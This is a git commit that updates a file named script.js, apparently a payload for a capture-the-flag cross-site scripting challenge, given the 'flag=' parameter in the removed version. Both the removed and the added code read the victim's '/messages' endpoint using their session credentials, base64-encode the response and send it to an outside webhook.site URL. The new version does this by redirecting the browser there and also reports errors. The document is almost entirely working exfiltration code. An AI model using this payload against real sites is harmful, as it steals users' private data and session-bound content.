1cab9ca89e9f26252b34c83c3fa6f1403a8c0791
Diego Sánchez García <73583493+mkroot7@users.noreply.github.com>
2025-10-03 23:03:31 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,11 @@
-fetch('/messages?id=1')
-  .then(r => r.text())
-  .then(d => {
-    fetch('https://webhook.site/376da9f2-490d-4e83-85f5-c6ca830535d8?flag='+btoa(d));
-  });
+(async function(){
+  try {
+    const r = await fetch('/messages', { credentials: 'include' });
+    const d = await r.json();
+
+    const encoded = btoa(JSON.stringify(d));
+    location.href = 'https://webhook.site/81277136-69e8-4e3e-a145-c916922aedd1/?d=' + encodeURIComponent(encoded);
+  } catch (e) {
+    location.href = 'https://webhook.site/81277136-69e8-4e3e-a145-c916922aedd1/?err=' + encodeURIComponent(String(e));
+  }
+})();
